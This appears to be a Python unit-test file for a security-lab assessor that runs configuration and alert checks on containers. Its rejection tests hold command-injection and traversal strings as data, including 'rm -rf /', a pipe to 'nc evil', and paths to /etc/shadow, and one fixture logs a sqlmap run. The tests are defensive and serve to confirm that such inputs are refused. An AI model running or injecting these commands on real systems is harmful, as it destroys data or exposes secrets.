"""6v6 Assessor — 보안 핵심 로직 단위 테스트 (stdlib unittest 만; docker/fastapi 불필요).

검증 초점(7절 DoD):
  - CC 가 준 임의 문자열이 셸 exec 로 흐르지 않음(argv 템플릿 + 화이트리스트)
  - 미지원 type / 위험 파라미터는 passed:false 가 아니라 명시적 error 로 거부
  - alerts.json 필터(wazuh_alert/fim_change/command_ran) 정확성
  - targets 별칭 해석

실행:  python3 -m unittest assessor.tests.test_checks -v   (repo 루트에서)
"""
from __future__ import annotations

import unittest

from assessor.checks import run_check, SUPPORTED_TYPES
from assessor.checks.base import ExecResult
from assessor import targets


class FakeExecutor:
    """argv 를 기록하고 정해진 결과를 반환. 셸이 개입하지 않음을 검증하는 데 사용."""

    def __init__(self, result: ExecResult | None = None):
        self.calls: list[tuple[str, list[str]]] = []
        self._result = result or ExecResult(0, "", "")

    def exec(self, container, argv, timeout=15):
        self.calls.append((container, argv))
        return self._result


class FakeAlerts:
    def __init__(self, alerts):
        self._alerts = alerts

    def alerts(self, since_sec=None):
        return list(self._alerts)


# ─── targets ────────────────────────────────────────────────────────────────
class TargetsTest(unittest.TestCase):
    def test_aliases(self):
        self.assertEqual(targets.resolve_container("web"), "6v6-web")
        self.assertEqual(targets.resolve_container("waf"), "6v6-web")
        self.assertEqual(targets.resolve_container("fw"), "6v6-fw")
        self.assertEqual(targets.resolve_container("secu"), "6v6-fw")
        self.assertEqual(targets.resolve_container("ips"), "6v6-ips")
        self.assertEqual(targets.resolve_container("ids"), "6v6-ips")
        self.assertEqual(targets.resolve_container("siem"), "6v6-siem")
        self.assertEqual(targets.resolve_container("admin"), "6v6-adminconsole")
        self.assertEqual(targets.resolve_container("6v6-web"), "6v6-web")

    def test_unknown(self):
        with self.assertRaises(KeyError):
            targets.resolve_container("does-not-exist")


# ─── 호스트 검사: argv 템플릿 합성 ────────────────────────────────────────────
class HostCheckTest(unittest.TestCase):
    def test_file_exists_argv_no_shell(self):
        ex = FakeExecutor(ExecResult(0, "/etc/x|size=10|mtime=now", ""))
        r = run_check({"id": "c1", "type": "file_exists", "target": "web",
                       "params": {"path": "/etc/apache2/apache2.conf"}}, ex, None)
        self.assertTrue(r["passed"])
        cont, argv = ex.calls[0]
        self.assertEqual(cont, "6v6-web")
        # argv 는 list — 셸 해석 없음. path 는 단일 인자로 전달.
        self.assertEqual(argv[0], "stat")
        self.assertIn("/etc/apache2/apache2.conf", argv)

    def test_file_exists_not_found(self):
        ex = FakeExecutor(ExecResult(1, "", "No such file"))
        r = run_check({"id": "c1", "type": "file_exists", "target": "web",
                       "params": {"path": "/nope"}}, ex, None)
        self.assertFalse(r["passed"])

    def test_file_contains_fixed_vs_regex(self):
        ex = FakeExecutor(ExecResult(0, "12:SecRuleEngine On", ""))
        run_check({"id": "c", "type": "file_contains", "target": "web",
                   "params": {"path": "/etc/modsecurity/modsecurity.conf",
                              "pattern": "SecRuleEngine On"}}, ex, None)
        self.assertIn("-F", ex.calls[0][1])   # 고정 문자열
        ex2 = FakeExecutor(ExecResult(0, "x", ""))
        run_check({"id": "c", "type": "file_contains", "target": "web",
                   "params": {"path": "/etc/x", "regex": "Sec.*On"}}, ex2, None)
        self.assertIn("-E", ex2.calls[0][1])  # 정규식

    def test_port_listening_parse(self):
        ss_out = ("State  Recv-Q Send-Q Local Address:Port Peer Address:Port\n"
                  "LISTEN 0      128    0.0.0.0:80        0.0.0.0:*\n"
                  "LISTEN 0      128    0.0.0.0:22        0.0.0.0:*\n")
        ex = FakeExecutor(ExecResult(0, ss_out, ""))
        r = run_check({"id": "c", "type": "port_listening", "target": "web",
                       "params": {"port": 80}}, ex, None)
        self.assertTrue(r["passed"])
        ex2 = FakeExecutor(ExecResult(0, ss_out, ""))
        r2 = run_check({"id": "c", "type": "port_listening", "target": "web",
                        "params": {"port": 8080}}, ex2, None)
        self.assertFalse(r2["passed"])

    def test_process_running(self):
        ex = FakeExecutor(ExecResult(0, "123 /usr/sbin/apache2 -D FOREGROUND", ""))
        r = run_check({"id": "c", "type": "process_running", "target": "web",
                       "params": {"pattern": "apache2"}}, ex, None)
        self.assertTrue(r["passed"])
        self.assertIn("apache2", ex.calls[0][1])

    def test_log_contains_python_filter(self):
        ex = FakeExecutor(ExecResult(0, "line a\nALERT sqli here\nline b\n", ""))
        r = run_check({"id": "c", "type": "log_contains", "target": "ips",
                       "params": {"log": "suricata", "pattern": "sqli"}}, ex, None)
        self.assertTrue(r["passed"])
        self.assertEqual(ex.calls[0][0], "6v6-ips")   # suricata 기본 컨테이너
        self.assertEqual(ex.calls[0][1][0], "tail")


# ─── 보안: 주입/미지원은 명시적 error(passed None) ────────────────────────────
class SecurityRejectTest(unittest.TestCase):
    def _err(self, spec):
        r = run_check(spec, FakeExecutor(), None)
        self.assertIsNone(r["passed"], f"should be rejected: {spec}")
        self.assertIn("error", r)
        return r

    def test_unsupported_type(self):
        self._err({"id": "c", "type": "run_shell", "target": "web",
                   "params": {"cmd": "rm -rf /"}})

    def test_path_injection_semicolon(self):
        self._err({"id": "c", "type": "file_exists", "target": "web",
                   "params": {"path": "/etc/passwd; rm -rf /"}})

    def test_path_traversal(self):
        self._err({"id": "c", "type": "file_exists", "target": "web",
                   "params": {"path": "/var/../../etc/shadow"}})

    def test_path_with_space_and_pipe(self):
        self._err({"id": "c", "type": "file_contains", "target": "web",
                   "params": {"path": "/etc/x | nc evil 1", "pattern": "x"}})

    def test_pattern_control_char(self):
        self._err({"id": "c", "type": "file_contains", "target": "web",
                   "params": {"path": "/etc/x", "pattern": "a\nb"}})

    def test_unknown_target(self):
        self._err({"id": "c", "type": "file_exists", "target": "evilbox",
                   "params": {"path": "/etc/x"}})

    def test_port_out_of_range(self):
        self._err({"id": "c", "type": "port_listening", "target": "web",
                   "params": {"port": 99999}})

    def test_missing_params(self):
        self._err({"id": "c", "type": "file_exists", "target": "web", "params": {}})

    def test_no_exec_on_rejection(self):
        # 거부된 요청은 컨테이너 exec 가 일어나지 않아야 함
        ex = FakeExecutor()
        run_check({"id": "c", "type": "file_exists", "target": "web",
                   "params": {"path": "/etc/passwd; whoami"}}, ex, None)
        self.assertEqual(ex.calls, [])


# ─── Wazuh alerts.json 필터 ──────────────────────────────────────────────────
def _alert(rule_id, level, groups, **extra):
    a = {"timestamp": "2026-06-03T12:00:00.000+0000",
         "rule": {"id": rule_id, "level": level, "groups": groups,
                  "description": extra.pop("desc", "test")},
         "agent": {"name": extra.pop("agent", "web")}}
    a.update(extra)
    return a


class WazuhCheckTest(unittest.TestCase):
    def test_wazuh_alert_by_rule_id(self):
        src = FakeAlerts([_alert("5710", 5, ["authentication_failed"]),
                          _alert("100250", 3, ["haproxy", "denat"])])
        r = run_check({"id": "c", "type": "wazuh_alert",
                       "params": {"rule_id": "100250"}}, None, src)
        self.assertTrue(r["passed"])
        r2 = run_check({"id": "c", "type": "wazuh_alert",
                        "params": {"rule_id": "999999"}}, None, src)
        self.assertFalse(r2["passed"])

    def test_wazuh_alert_by_groups(self):
        src = FakeAlerts([_alert("100251", 6, ["haproxy", "web_attack", "attack"])])
        r = run_check({"id": "c", "type": "wazuh_alert",
                       "params": {"groups": ["web_attack"]}}, None, src)
        self.assertTrue(r["passed"])

    def test_fim_change(self):
        a = _alert("550", 7, ["syscheck", "ossec"],
                   syscheck={"path": "/etc/nftables.conf", "event": "modified"})
        src = FakeAlerts([a])
        r = run_check({"id": "c", "type": "fim_change",
                       "params": {"path": "/etc/nftables.conf"}}, None, src)
        self.assertTrue(r["passed"])
        # 디렉터리 prefix 매칭
        a2 = _alert("550", 7, ["syscheck"],
                    syscheck={"path": "/etc/suricata/suricata.yaml", "event": "modified"})
        src2 = FakeAlerts([a2])
        r2 = run_check({"id": "c", "type": "fim_change",
                        "params": {"dir": "/etc/suricata"}}, None, src2)
        self.assertTrue(r2["passed"])
        # 비-syscheck 알림은 매칭 안 됨
        src3 = FakeAlerts([_alert("100250", 3, ["haproxy"])])
        r3 = run_check({"id": "c", "type": "fim_change",
                        "params": {"path": "/etc/nftables.conf"}}, None, src3)
        self.assertFalse(r3["passed"])

    def test_command_ran(self):
        a = _alert("100260", 3, ["6v6", "cmdlog", "audit"],
                   data={"cmd_user": "ccc", "cmd_host": "attacker",
                         "command": "sqlmap -u http://juice.6v6.lab"},
                   full_log="6v6cmd: host=attacker user=ccc pwd=/home/ccc rc=0 cmd=sqlmap -u ...")
        src = FakeAlerts([a])
        r = run_check({"id": "c", "type": "command_ran",
                       "params": {"pattern": "sqlmap"}}, None, src)
        self.assertTrue(r["passed"])
        # user 필터
        r2 = run_check({"id": "c", "type": "command_ran",
                        "params": {"pattern": "sqlmap", "user": "root"}}, None, src)
        self.assertFalse(r2["passed"])
        # 비-cmdlog 알림 무시
        src2 = FakeAlerts([_alert("5710", 5, ["authentication_failed"])])
        r3 = run_check({"id": "c", "type": "command_ran",
                        "params": {"pattern": "sqlmap"}}, None, src2)
        self.assertFalse(r3["passed"])


class CatalogTest(unittest.TestCase):
    def test_supported_types(self):
        for t in ("file_exists", "file_contains", "file_hash", "process_running",
                  "port_listening", "log_contains", "wazuh_alert", "fim_change",
                  "command_ran"):
            self.assertIn(t, SUPPORTED_TYPES)


if __name__ == "__main__":
    unittest.main(verbosity=2)
